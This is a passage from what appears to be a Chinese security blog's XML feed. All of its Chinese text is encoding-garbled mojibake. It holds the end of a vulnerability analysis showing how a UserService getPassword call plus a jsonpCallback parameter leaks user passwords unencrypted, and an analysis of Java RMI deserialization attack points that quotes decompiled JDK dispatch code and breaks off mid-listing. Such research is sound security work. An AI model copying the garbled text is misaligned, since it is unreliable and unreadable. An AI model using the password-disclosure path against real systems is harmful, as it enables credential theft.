å…¥å±é™©å‚æ•°è¿›è¡Œè°ƒç”¨ã€‚</p><p>æ‰€ä»¥åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¤§æ¦‚æ¸…æ¥šäº†æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚ä¸‹é¢æˆ‘ä»¬å…·ä½“åˆ†æä¸€ä¸‹æ¯ä¸ªå‚æ•°çš„å«ä¹‰ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/28/81b28fb7aeaa4a5195f4c9d1e159ddcd.md.png" alt="image-20230801172045204"></p><p>çº¢è‰²éƒ¨åˆ†ä¸ºclassNameçš„åˆ©ç”¨è¿‡ç¨‹ã€‚</p><p>é¦–å…ˆ<code>processExecute()</code>ä¼šæ¥æ”¶æˆ‘ä»¬ä¼ å…¥çš„<code>className</code>ã€<code>methodName</code>ã€<code>params</code>ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹<code>className</code>ï¼š</p><p>å®ƒé€šè¿‡<code>RMIModule.getInstance()</code>æ–¹æ³•è·å–<code>RMIModule</code>çš„å®ä¾‹ï¼Œç„¶åè°ƒç”¨å…¶<code>getService(className)</code>æ–¹æ³•æ¥è·å–æŒ‡å®šç±»å<code>ï¼ˆclassNameï¼‰</code>å¯¹åº”çš„æœåŠ¡å¯¹è±¡ã€‚åªæœ‰æœ€ç»ˆçš„<code>service</code>ä¸ä¸ºnullæ‰èƒ½è¿›å…¥åˆ°åç»­çš„åˆ©ç”¨ã€‚</p><p><code>UserService</code>æ˜¯ä¸€ä¸ªç”¨æˆ·æœåŠ¡ç±»ï¼Œç”¨äºç®¡ç†ç”¨æˆ·ã€è§’è‰²å’Œç”¨æˆ·ç»„çš„ä¿¡æ¯ã€‚å®ƒæä¾›äº†ä¸€ç³»åˆ—æ–¹æ³•æ¥è¿›è¡Œç”¨æˆ·ã€è§’è‰²å’Œç”¨æˆ·ç»„çš„åˆ›å»ºã€æ›´æ–°ã€åˆ é™¤ä»¥åŠç›¸å…³æ“ä½œã€‚</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªèƒ½ä¼ å…¥<code>UserService</code>ï¼›æˆ‘è¯•è¿‡ç™½åå•ä¸­å…¶ä»–ç±»æ–¹æ³•ï¼Œä½†æ˜¯æ²¡æœ‰å¯ä»¥æˆåŠŸåˆ©ç”¨çš„ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹å…¶ä»–ä¸¤ä¸ªå˜é‡<code>methondName</code>å’Œ<code>jsonParams</code>ã€‚åœ¨æ»¡è¶³<code>service != null</code>çš„å‰æä¸‹ï¼Œæˆ‘ä»¬ä¼šè¿›å…¥åˆ°<code>service.execute()</code>è€Œè¿™ä¸ªæ–¹æ³•æ­£å¥½å°±æ¥æ”¶æˆ‘ä»¬ä¼ å…¥çš„<code>methodName</code>å’Œ<code>jsonParams</code>ã€‚</p><p>é‚£æˆ‘ä»¬å¯ä»¥è·Ÿè¿›ä¸€ä¸‹ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/a447def7cb46b3d7c7cd0f83d20cb67e.md.png" alt="image-20230802090138733"></p><p><img src="https://ice.frostsky.com/2023/08/28/37201375faab7231742ddbadbd0de3e6.md.png" alt="image-20230802090709454"></p><p>å®ƒé€šè¿‡åå°„æœºåˆ¶è·å–æ–¹æ³•å¯¹è±¡ï¼Œå¹¶æ ¹æ®å‚æ•°çš„ç±»å‹å’Œä¸ªæ•°è¿›è¡Œæ ¡éªŒå’Œæ•°æ®è½¬æ¢ï¼Œæœ€åè°ƒç”¨<code>executeInternal</code>æ–¹æ³•è¿›è¡Œåå°„è°ƒç”¨ä¼ å…¥çš„å˜é‡<code>var3</code>æ–¹æ³•ä¸­çš„<code>this.b</code>ä¼ å…¥<code>var2</code>å¹¶è¿”å›æ‰§è¡Œç»“æœ</p><p>æˆ‘ä»¬å†è¿›ä¸€æ­¥è¿›è¡Œè·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/78ac74312662f4599f43f2e2bec416ea.md.png" alt="image-20230802091659449"></p><p><img src="https://ice.frostsky.com/2023/08/28/8fed8cb0ffa6a406dc51b6ec55a5b5ff.png" alt="image-20230802092212469"></p><p>ç»ˆäºå‘ç°äº†æ¼æ´è§¦å‘ç‚¹ï¼Œè€Œ<code>getPassword</code>ç®€å•æ¥è¯´å°±æ˜¯è·å–æŒ‡å®šç”¨æˆ·çš„å¯†ç ã€‚å¹¶è¿”å›æŸ¥è¯¢ç»“æœï¼Œ<code>params</code>å°±æ˜¯æˆ‘ä»¬éœ€è¦æŸ¥è¯¢å¯†ç çš„ç”¨æˆ·åã€‚</p><p><img src="https://ice.frostsky.com/2023/08/28/90aea7da533adac5b022be5a4a04f4c6.png" alt="image-20230802092338015"></p><p>ç»è¿‡å‰é¢æˆ‘ä»¬å¯¹å‰ä¸‰ä¸ªå‚æ•°çš„åˆ†ææˆ‘ä»¬å·²ç»å¤§æ¦‚æ¸…æ¥šäº†æ¼æ´åˆ©ç”¨æµç¨‹ã€‚è¿™æ—¶å€™ä½ å¯èƒ½ä¼šé—®ï¼šä½ ä¸Šé¢çš„POSTæ•°æ®å¯ä¸æ­¢ä¼ å…¥äº†ä¸‰ä¸ªå‚æ•°ã€‚</p><p>å…¶å®æœ€åä¸€ä¸ªå‚æ•°çš„å«ä¹‰æ˜¯ä¸ºäº†è®©ä»–èƒ½å¤Ÿä¸åŠ å¯†å°†ç»“æœè¿”å›åˆ°é¡µé¢å½“ä¸­ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ä»£ç ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/0bef977ad6ce603c65b8a7a66b5b4f7b.png" alt="image-20230802092849303"></p><p>è¿™ä¸€æ­¥ä¼šä»requestä¸­æ¥æ”¶å‚æ•°<code>jsonpCallback</code>å¹¶è¿›è¡Œåˆ¤æ–­ï¼Œè‹¥ä¸ºç©ºåˆ™å¯¹å“åº”æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œè‹¥ä¸ä¸ºç©ºåˆ™ä¸åŠ å¯†ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥éšæ„æ„é€ å‚æ•°<code>jsonpCallback</code>ä¿è¯å›æ˜¾åˆ°é¡µé¢çš„æ•°æ®æ˜¯æ²¡æœ‰åŠ å¯†çš„ã€‚</p><p>å½“ç„¶é»‘å®¢ä¹Ÿå¯ä»¥é€‰æ‹©ä¸Šé¢çš„ifåˆ†æ”¯ï¼Œå¾—åˆ°åŠ å¯†çš„è¿”å›æ•°æ®åï¼Œè‡ªå·±å¯¹å…¶è¿›è¡Œè§£å¯†ã€‚è¿™æ ·ä½¿å¾—æµé‡ä¼šæ›´åŠ éšè”½ä»è€Œä¸å®¹æ˜“è¢«å‘ç°ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´åˆ†æ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ²¡äººæ¯”æˆ‘æ›´æ‡‚RMI(ä¸‹)</title>
    <link href="/2023/08/26/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI3/"/>
    <url>/2023/08/26/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI3/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>ç»ˆäºæ¥åˆ°æœ€åä¸€ç¯‡äº†ï¼Œè¿™ä¸ªRMIç¡®å®æ‹–äº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼Œä¸€ç›´æ²¡æ—¶é—´å†™ï¼Œè¿˜å‘ç°æœ‰å¾ˆå¤šæ–°çš„ä¸œè¥¿éœ€è¦å†™ï¼Œä½†æ˜¯è‡ªå·±åˆæ²¡æœ‰æ—¶é—´ï¼Œï¼Œï¼Œï¼Œåé¢è¿˜æœ‰ç±»åŠ è½½ã€Fastjsonã€CCã€CBï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œæ„Ÿè§‰è‡ªå·±è¿˜æœ‰å¥½å¤šä¸œè¥¿è¦å­¦ï¼Œå¤§è„‘æœ‰ç‚¹ä¸å¤Ÿç”¨äº†(çŒªè„‘è¿‡è½½)ï¼Œè¿˜æ˜¯æ…¢æ…¢ç§¯ç´¯ï¼Œæ…¢æ…¢æˆé•¿å§ã€‚å™¢ï¼Œå¯¹äº†ä¸Šæ¬¡å¿˜äº†æ¯ç¯‡é¸¡æ±¤ï¼Œè¿™æ¬¡ä¸€å¹¶è¡¥ä¸Šï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">è·¯æ¼«æ¼«å…¶ä¿®è¿œå…®ï¼Œå¾å°†ä¸Šä¸‹è€Œæ±‚ç´¢<br>                            â€”â€”å±ˆåŸ<br>åƒç£¨ä¸‡å‡»è¿˜åšéŸ§ï¼Œä»»å°”ä¸œå—è¥¿åŒ—é£<br>                                â€”â€”éƒ‘æ¿æ¡¥<br></code></pre></td></tr></table></figure><h1 id="æ”»å‡»å®¢æˆ·ç«¯ï¼š"><a href="#æ”»å‡»å®¢æˆ·ç«¯ï¼š" class="headerlink" title="æ”»å‡»å®¢æˆ·ç«¯ï¼š"></a>æ”»å‡»å®¢æˆ·ç«¯ï¼š</h1><h2 id="æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯"><a href="#æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯"></a>æ³¨å†Œä¸­å¿ƒæ”»å‡»å®¢æˆ·ç«¯</h2><p><img src="https://ice.frostsky.com/2023/08/16/df88fdc4cd57d758745a70045e5a1e02.md.png" alt="img"></p><p>é€šè¿‡å›¾ç‰‡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ³¨å†Œä¸­å¿ƒä¸å®¢æˆ·ç«¯ä¹‹é—´é€šä¿¡æ˜¯ä¸ºäº†è·å–stubã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¸‹æ–­ç‚¹è·Ÿä¸€ä¸‹çœ‹çœ‹é‡Œé¢ç©¶ç«Ÿè—ç€ä»€ä¹ˆçŒ«è…»ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/26/36a6f00d9e4eb752d3223dafee3b2b28.png" alt="image-20230825201413522"></p><p>ç›´æ¥æ¥åˆ°RegistryImpl_Stub.<code>lookup</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/1331dd3bee5072c5ed1fd4194cb1fd88.png" alt="image-20230825202452411"></p><p>è¿›æ¥ä¹‹åä¸€çœ¼çœ‹åˆ°ä¸‰éƒ¨åˆ†1,3éƒ¨åˆ†å¾ˆç®€å•å°±æ˜¯å…ˆå°†ä¼ å…¥çš„å­—ç¬¦åºåˆ—åŒ–ä¼ ç»™æ³¨å†Œä¸­å¿ƒï¼Œæœ€åå†æŠŠæ³¨å†Œä¸­å¿ƒè¿”å›çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>è¿™ä¸ªååºåˆ—åŒ–çš„ç‚¹å°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œå‡å¦‚æ³¨å†Œä¸­å¿ƒè¿”å›ä¸€ä¸ªæ¶æ„ç±»ï¼Œå®¢æˆ·ç«¯ååºåˆ—åŒ–ä¹‹åä¼šç›´æ¥æ‰§è¡Œã€‚æ‰€ä»¥è¿™å°±æ˜¯æˆ‘ä»¬æ”»å‡»å®¢æˆ·ç«¯çš„<strong>ç¬¬ä¸€ç§æ–¹æ³•</strong>ã€‚</p><p>è¿˜æœ‰æ¯”è¾ƒæœ‰æ„æ€çš„ç¬¬2éƒ¨åˆ†ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/005b268fafa06afa159051dd334505b5.png" alt="image-20230825202810211"></p><p>å¯ä»¥çœ‹åˆ°å®ƒæ˜¯UnicastRef.invoke(var2)å…·ä½“çš„å€¼ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å†æ¬¡è¿›è¡Œè·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/39abf3697a5320e58b3cc8ee1345e9a7.png" alt="image-20230825203034282"></p><p>å†æ¬¡è·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/9934ef72761e25b6af45da084a910979.png" alt="image-20230825203409694"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ•è·2å¼‚å¸¸ï¼Œå¦‚æœå¼‚å¸¸ä¸º2ï¼Œåˆ™ä¼šå¯¹æµè¿›è¡Œååºåˆ—åŒ–ï¼Œè¿™é‡Œçš„æœ¬æ„å¯èƒ½æ˜¯æƒ³é€šè¿‡ååºåˆ—åŒ–æ¥è·å–æ›´è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ï¼Œä½†æ˜¯è¿™é‡Œå®é™…ä¸Šä¹Ÿæ˜¯åˆ©ç”¨ç‚¹ï¼Œä¸”è¿™ä¸ªåˆ©ç”¨ç‚¹æ›´åŠ éšè”½ã€ä¸”èŒƒå›´æ›´å¹¿ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´ï¼Ÿ</p><p><img src="https://ice.frostsky.com/2023/08/26/775e23f0e68790ebacaa59f221f573ae.png" alt="image-20230825203804805"></p><p>å› ä¸ºåªè¦æ˜¯è°ƒç”¨çš„è¿™ä¸ªinvokeçš„å‡½æ•°éƒ½ä¼šè§¦å‘ååºåˆ—åŒ–ï¼Œä½†æ˜¯åœ¨å¤„ç†ç½‘ç»œè¯·æ±‚çš„æ—¶å€™ï¼Œä¼šå¤§é‡çš„è°ƒç”¨è¿™ä¸ªinvokeï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ›´å±é™©ã€‚</p><h2 id="æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯"><a href="#æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯" class="headerlink" title="æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯"></a>æœåŠ¡ç«¯æ”»å‡»å®¢æˆ·ç«¯</h2><p><img src="https://ice.frostsky.com/2023/08/26/2c9149d9057e5bcbdbb5aa2e77cfad36.png" alt="image-20230826103901123"></p><p>è·Ÿè¿›å®¢æˆ·ç«¯è°ƒå–æœåŠ¡ç«¯è¿œç¨‹å¯¹è±¡ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/1477b782d19faf5eb67b4a2e894248bf.png" alt="image-20230826104100632"></p><p>ç›´æ¥æ¥åˆ°äº†<code>invoke</code>æ–¹æ³•å¹¶è°ƒç”¨<code>invokeRemoteMethod(proxy, method, args);</code>å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å †æ ˆä¿¡æ¯å’Œå…·ä½“ä¼ å…¥çš„å‚æ•°ã€‚æˆ‘ä»¬å†æ¬¡è·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/b16a1c7f349a0002f64f74ef4faa11b5.png" alt="image-20230826104547535"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œåˆè°ƒç”¨äº†UnicastRef.<code>invoke()</code>ä½†æ˜¯è¿™é‡Œçš„<code>invoke</code>æ˜¯é‡è½½è¿‡çš„ï¼Œå’Œæˆ‘ä»¬ä¸Šé¢çš„UnicastRef.<code>invoke()</code>æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œæˆ‘ä»¬å†æ¬¡è·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/3dda57d373c80b5661646a6527f33134.png" alt="image-20230826105829638"></p><p><img src="https://ice.frostsky.com/2023/08/26/61ecc78d109c92206b5634ec7971165f.png" alt="image-20230826110042875"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„<code>marshalValue()</code>å…¶å®æ˜¯å°†æˆ‘ä»¬è¾“å…¥è¿›è¡Œåºåˆ—åŒ–ï¼Œé€šè¿‡å‚æ•°ä¿¡æ¯ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå°†æˆ‘ä»¬è°ƒç”¨çš„è¿œç¨‹æ–¹æ³•<code>hello</code>ä¹Ÿä¼ å…¥è¿›å»ã€‚</p><p>å®Œäº†ä¹‹ååˆè°ƒç”¨äº†<code>executeCall()</code>ä¹Ÿå°±æ˜¯è¯´æ‰€æœ‰å®¢æˆ·ç«¯çš„è¯·æ±‚éƒ½ä¼šè°ƒç”¨è¿™ä¸ª<code>executeCall()</code>æ–¹æ³•ã€‚æˆ‘ä»¬å†å¾€åçœ‹ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/32353af6f402ca4cf7ddbb7f328e7450.png" alt="image-20230826110437577"></p><p>è¿™é‡Œä¼šè·å–åˆ°æœåŠ¡ç«¯çš„è¿”å›å€¼ä¼ å…¥<code>unmarshalValue()</code>è€Œåœ¨è¿™ä¸ª<code>unmarshalValue()</code>ä¸­å…¶å®æ˜¯å°†è¿”å›å€¼è¿›è¡Œååºåˆ—åŒ–ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/cd64e5434f009bee7c5efe488c65e8b8.png" alt="image-20230826110607396"></p><p>æ‰€ä»¥çœ‹åˆ°è¿™æˆ‘ä»¬ä¹Ÿæ˜ç™½äº†ï¼Œå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´ï¼Œå®¢æˆ·ç«¯ä¹Ÿæ˜¯æœ‰ä¸¤ä¸ªååºåˆ—åŒ–çš„ç‚¹ã€‚</p><p>é¦–å…ˆç¬¬ä¸€ä¸ªï¼Œç»†å¿ƒçš„åŒå­¦å¯ä»¥çœ‹åˆ°ä¸Šå›¾æˆ‘åœ¨<code>executeCall()</code>æ‰“äº†æ–­ç‚¹ä½†æ˜¯æ²¡è·Ÿè¿›å»ï¼ŒåŸå› æ˜¯å› ä¸ºä»–å’Œä¹‹å‰(å®¢æˆ·ç«¯ä¸æ³¨å†Œä¸­å¿ƒ)çš„<code>executeCall()</code>æ˜¯ä¸€æ ·çš„ã€‚ä»–ä¹‹ä¸­ä¹Ÿæœ‰ååºåˆ—åŒ–çš„ç‚¹ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/c4463143ebec771dd9b8666e7387967b.png" alt="image-20230826111124434"></p><p>ç¬¬äºŒä¸ªååºåˆ—åŒ–çš„ç‚¹å°±æ˜¯æˆ‘ä»¬åˆ†æçš„<code>unmarshalValue()</code>ä¸­å°†æœåŠ¡ç«¯è¿”å›å€¼ååºåˆ—åŒ–ã€‚</p><h1 id="æ”»å‡»æ³¨å†Œä¸­å¿ƒ"><a href="#æ”»å‡»æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="æ”»å‡»æ³¨å†Œä¸­å¿ƒ"></a>æ”»å‡»æ³¨å†Œä¸­å¿ƒ</h1><h2 id="å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ"><a href="#å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ"></a>å®¢æˆ·ç«¯æ”»å‡»æ³¨å†Œä¸­å¿ƒ</h2><p>å½“å®¢æˆ·ç«¯åœ¨è¯·æ±‚æ³¨å†Œä¸­å¿ƒæ—¶ä¼šæ¥åˆ°Transport.<code>serviceCall()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/0be7267dd72c68390f7ea89a10b04b77.png" alt="image-20230826113208590"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå…ˆæ˜¯è·å–Targetï¼Œè€Œè¿™ä¸ªTargetä¹Ÿå°±æ˜¯RegistryImpl_Stubï¼Œåé¢ä¼šè·å–åˆ†å‘å™¨ï¼Œè€Œé‡Œé¢çš„å†…å®¹å°±æ˜¯skelã€‚åé¢ä¼šè°ƒç”¨<code>dispatch()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/083de88bc3740d5bd73ced9be63624d7.png" alt="image-20230826113532626"></p><p><img src="https://ice.frostsky.com/2023/08/26/d4d0a560d9bcc88264c73eda7e495756.png" alt="image-20230826113741741"></p><p>è¿™ä¸ªdispatchä¹Ÿå°±æ˜¯<code>UnicastServerRef</code>æˆ‘ä»¬å†æ¬¡è¿›è¡Œè·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/cfa9bb3800410d3cde8595168fab9cbd.png" alt="image-20230826114527833"></p><p>è¿™é‡Œé¦–å…ˆæ˜¯è·å–è¾“å…¥ï¼Œåœ¨æ£€æŸ¥skelå­—æ®µæ˜¯å¦ä¸ºç©ºï¼Œä¸ä¸ºç©ºåˆ™è°ƒç”¨<code>oldDispatch()</code>ï¼Œé‚£æˆ‘ä»¬å†è·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/26/437eb1fb27f674449cbd30b97fbe99a4.png" alt="image-20230826114853814"></p><p>è¿™é‡Œä¹Ÿå°±ç»ˆäºèµ°åˆ°äº†skel.<code>dispatch()</code>ï¼Œè¿™ä¸ª<code>dispatch()</code>ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šä¸€ç¯‡è®²åˆ°çš„é‚£å‡ ç§æ–¹æ³•å¯¹åº”çš„caseï¼Œä»–ä¼šå¯¹ä¸åŒçš„æ–¹æ³•æ‰§è¡Œä¸åŒçš„readObjectã€‚ï¼ˆå› ä¸ºï¼Œæˆªä¸ä¸‹ã€‚æˆ‘è´´ä¸€ä¸‹ï¼Œè¿™æ ·å¤§å®¶å°±ä¸ç”¨å›å»çœ‹äº†ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>        String var7;<br>        ObjectInput var8;<br>        ObjectInput var9;<br>        Remote var80;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.bind&quot;</span>);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var9 = var2.getInputStream();<br>                    var7 = (String)var9.readObject();<br>                    var80 = (Remote)var9.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var77) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var77);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.bind(var7, var80);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var76) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var76);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                var2.releaseInputStream();<br>                String[] var79 = var6.list();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var81</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var81.writeObject(var79);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var75) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var75);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">try</span> &#123;<br>                    var8 = var2.getInputStream();<br>                    var7 = (String)var8.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var73) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var73);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var80 = var6.lookup(var7);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var82</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var82.writeObject(var80);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var72) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var72);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>                RegistryImpl.checkAccess(<span class="hljs-string">&quot;Registry.rebind&quot;</span>);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var9 = var2.getInputStream();<br>                    var7 = (String)var9.readObject();<br>                    var80 = (Remote)var9.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException | IOException var70) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var70);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.rebind(var7, var80);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var69) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var69);<br>                &#125;<br>            <span 